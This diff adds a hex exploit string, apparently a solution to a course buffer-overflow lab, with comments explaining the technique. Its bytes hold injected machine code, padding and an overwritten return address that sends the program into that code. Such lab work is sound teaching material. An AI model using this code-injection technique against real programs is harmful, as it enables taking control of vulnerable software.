@@ -1,0 +1,8 @@
+48 c7 c7 5c 71 17 71 68 
+ac 13 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 //Similar to Level 1, using a buffer overflow to change the return address to the start of this code will allow the program to execute the code we injected
+98 06 64 55 00 00 00 00 //Getbuf calls the function Gets to gain the buffer, so let's look at the position of the buffer after the call
